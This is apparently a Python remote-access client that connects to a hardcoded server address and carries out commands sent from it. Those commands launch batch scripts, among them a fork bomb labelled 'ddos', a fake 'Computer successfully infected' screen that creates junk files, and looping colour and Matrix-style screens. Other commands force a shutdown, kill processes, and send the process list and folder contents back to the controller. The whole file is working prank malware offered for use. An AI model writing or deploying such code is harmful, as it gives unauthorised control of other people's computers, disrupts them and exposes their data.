import socket
import subprocess
import sys
import time
import os
import webbrowser
import signal
import psutil

def client_side():
    # Client Side  
    socket_server = socket.socket()
    server_host = socket.gethostname()
    print(server_host)
    ip_name = socket.gethostbyname(server_host)
    sport = 8080

    server_host = "172.20.10.2"
    name = ip_name
    socket_server.connect((server_host, sport))

    socket_server.send(name.encode())
    server_name = socket_server.recv(1024)
    server_name = server_name.decode()

    print(server_name, ' has joined...')
    while True:
        message = (socket_server.recv(1024)).decode()

        if message=='hii':
            f = open("script.bat","w")
            f.write("""
            @echo off
            color 0a
            echo %random%%random%%random%happyface :)
            echo %random%%random%%random%happyface :)
            echo %random%%random%%random%happyface :)
            echo %random%%random%%random%happyface :)
            ping localhost -n 5 >nul
            dir /s
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            echo :) > %random%%random%.txt
            cls
            color 07
            echo Computer successfully infected.
            echo Press any key to exit.
            pause >nul
            exit""")
            f.close()

            os.startfile("script.bat")

        if message.startswith("web"):
            links = message.split("`")
            webbrowser.open(links[1])

        if message == "ddos":
            f= open("ddosscript.bat","w")
            f.write(""":top
                    start
                    goto top""")
            f.close()
            os.startfile("ddosscript.bat")

        if message == "shut":
            os.system("shutdown /s /t 1")

        if message == "shock":
            f= open("shock.bat","w")
            f.write("""@echo off
                    :start
                    color cb
                    echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)
                    
                    color 01
                    echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)
                    
                    color f2
                    echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)
                    
                    color 58
                    echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)
                    
                    color 4f
                    echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)
                    goto start""")
            f.close()
            os.startfile("shock.bat")

        if message == "matrix":
            f=open("matrix.bat","w")
            f.write("""@echo off
                color 02
                cls
                echo W
                ping localhost -n .15 >nul
                cls
                echo Wa
                ping localhost -n .15 >nul
                cls
                echo Wak
                ping localhost -n .15 >nul
                cls
                echo Wake
                ping localhost -n .15 >nul
                cls
                echo Wake
                ping localhost -n .15 >nul
                cls
                echo Wake u
                ping localhost -n .15 >nul
                cls
                echo Wake up
                ping localhost -n .15 >nul
                cls
                echo Wake up
                ping localhost -n .15 >nul
                cls
                echo Wake up N
                ping localhost -n .15 >nul
                cls
                echo Wake up Ne
                ping localhost -n .15 >nul
                cls
                echo Wake up Neo
                ping localhost -n .15 >nul
                cls
                echo Wake up Neo.
                ping localhost -n .15 >nul
                cls
                echo Wake up Neo..
                ping localhost -n .15 >nul
                cls
                echo Wake up Neo...
                ping localhost -n 5 >nul
                cls
                echo T
                ping localhost -n .15 >nul
                cls
                echo Th
                ping localhost -n .15 >nul
                cls
                echo The
                ping localhost -n .15 >nul
                cls
                echo The
                ping localhost -n .15 >nul
                cls
                echo The M
                ping localhost -n .15 >nul
                cls
                echo The Ma
                ping localhost -n .15 >nul
                cls
                echo The Mat
                ping localhost -n .15 >nul
                cls
                echo The Matr
                ping localhost -n .15 >nul
                cls
                echo The Matri
                ping localhost -n .15 >nul
                cls
                echo The Matrix
                ping localhost -n .15 >nul
                cls
                echo The Matrix
                ping localhost -n .15 >nul
                cls
                echo The Matrix h
                ping localhost -n .15 >nul
                cls
                echo The Matrix ha
                ping localhost -n .15 >nul
                cls
                echo The Matrix has
                ping localhost -n .15 >nul
                cls
                echo The Matrix has
                ping localhost -n .15 >nul
                cls
                echo The Matrix has y
                ping localhost -n .15 >nul
                cls
                echo The Matrix has yo
                ping localhost -n .15 >nul
                cls
                echo The Matrix has you
                ping localhost -n .15 >nul
                cls
                echo The Matrix has you.
                ping localhost -n .15 >nul
                cls
                echo The Matrix has you..
                ping localhost -n .15 >nul
                cls
                echo The Matrix has you...
                ping localhost -n 5 >nul
                cls
                echo F
                ping localhost -n .15 >nul
                cls
                echo Fo
                ping localhost -n .15 >nul
                cls
                echo Fol
                ping localhost -n .15 >nul
                cls
                echo Foll
                ping localhost -n .15 >nul
                cls
                echo Follo
                ping localhost -n .15 >nul
                cls
                echo Follow
                ping localhost -n .15 >nul
                cls
                echo Follow
                ping localhost -n .15 >nul
                cls
                echo Follow t
                ping localhost -n .15 >nul
                cls
                echo Follow th
                ping localhost -n .15 >nul
                cls
                echo Follow the
                ping localhost -n .15 >nul
                cls
                echo Follow the
                ping localhost -n .15 >nul
                cls
                echo Follow the w
                ping localhost -n .15 >nul
                cls
                echo Follow the wh
                ping localhost -n .15 >nul
                cls
                echo Follow the whi
                ping localhost -n .15 >nul
                cls
                echo Follow the whit
                ping localhost -n .15 >nul
                cls
                echo Follow the white
                ping localhost -n .15 >nul
                cls
                echo Follow the white
                ping localhost -n .15 >nul
                cls
                echo Follow the white r
                ping localhost -n .15 >nul
                cls
                echo Follow the white ra
                ping localhost -n .15 >nul
                cls
                echo Follow the white rab
                ping localhost -n .15 >nul
                cls
                echo Follow the white rabb
                ping localhost -n .15 >nul
                cls
                echo Follow the white rabbi
                ping localhost -n .15 >nul
                cls
                echo Follow the white rabbit
                ping localhost -n .15 >nul
                cls
                echo Follow the white rabbit.
                ping localhost -n 5 >nul
                cls
                echo K
                ping localhost -n .15 >nul
                cls
                echo Kn
                ping localhost -n .15 >nul
                cls
                echo Kno
                ping localhost -n .15 >nul
                cls
                echo Knoc
                ping localhost -n .15 >nul
                cls
                echo Knock
                ping localhost -n .15 >nul
                cls
                echo Knock,
                ping localhost -n .15 >nul
                cls
                echo Knock,
                ping localhost -n .15 >nul
                cls
                echo Knock, k
                ping localhost -n .15 >nul
                cls
                echo Knock, kn
                ping localhost -n .15 >nul
                cls
                echo Knock, kno
                ping localhost -n .15 >nul
                cls
                echo Knock, knoc
                ping localhost -n .15 >nul
                cls
                echo Knock, knock
                ping localhost -n .15 >nul
                cls
                echo Knock, knock,
                ping localhost -n .15 >nul
                cls
                echo Knock, knock,
                ping localhost -n .15 >nul
                cls
                echo Knock, knock, N
                ping localhost -n .15 >nul
                cls
                echo Knock, knock, Ne
                ping localhost -n .15 >nul
                cls
                echo Knock, knock, Neo
                ping localhost -n .15 >nul
                cls
                echo Knock, knock, Neo.
                ping localhost -n .15 >nul
                cls
                echo Knock, knock, Neo. .
                ping localhost -n .15 >nul
                cls
                echo Knock, knock, Neo. . .
                ping localhost -n 5 >nul
                cls
                :start
                echo 010 010 10 01 0100 10 010 10 010 1001 10 010 10 10 010 101110 10 100 100 1011
                echo 101010100 100 00100 010 0010 01000010 010 01000100010 01000 0100100 100 01000
                echo 101 0100010 1000001 01010 10 0100010 10 0010 010010 0 010 010 0000111001011011
                echo 000 010 01010010 010001001 00100100 1010 01001001 0010010 01001000100 00100111
                echo 001 0010 10 010010010 010 100 10 01 010 010 010 010 10 010 10 010 10 01010 0
                echo 000 010 00                    001 0010 00                    1000100 10
                echo 1111 10 010 01 0010100 10 01001010 1 11 0001 00 001 1 1 01  0100000 1 1 11 1
                echo 000 1000 10 010 100 0010 10 01 010 010 10000 010 010 01 10010010010 1001 100
                echo 1010010 010 100 010 10 010 10 010 1010 010 01 01 00001 010 01 010 010 10 001
                echo 111     11111     11111     11111     11111     11111     1111111   111111111
                echo 101010100 100 00100 010 0010 01000010 010 01000100010 01000 0100100 100 011
                echo 1111 10 010 01 0010100 10 01001010 1 11 0001 00 001 1 1 01  0100000 1 1 11 1
                echo 000 1000 10 010 100 0010 10 01 010 010 10000 010 010 01 10010010010 1001 10011
                echo 1010010 010 100 010 10 010 10 010 1010 010 01 01 00001 010 01 010 010 10 0011111
                echo 101 0100010 1000001 01010 10 0100010 10 0010 010010 0 010 010 00001110010110111
                echo 000 010 01010010 010001001 00100100 1010 01001001 0010010 01001000100 001001111
                echo 0000 00 000000000000 000000000000000000 00000000000001111 10 0100000 1000000111
                echo 111111111111111111111111111111111111111111111111111111111111111111111111111110
                goto start""")
            f.close()
            os.startfile("matrix.bat")

        if message == "listapps":
            output = subprocess.check_output("tasklist", shell=True, text=True)
            socket_server.send(output.encode())


        if message.startswith("closeapp"):
            app=message.split("`")
            name = app[1]
            subprocess.run(["taskkill", "/F", "/IM", name])

        if message.startswith("listfiles"):
            files=message.split("`")
            name=files[1]
            output = os.listdir(name)

            directories = "\n"
            for dir in output:
                directories+=dir+"\n"
            socket_server.send(directories.encode())

        if message.startswith("openfile"):
            files=message.split("`")
            name=files[1]
            webbrowser.open(name)




        socket_server.send("sucess!!".encode())

client_side()